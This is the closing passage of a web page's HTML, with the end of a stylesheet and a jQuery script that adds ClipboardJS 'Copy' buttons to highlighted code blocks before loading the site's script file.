            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>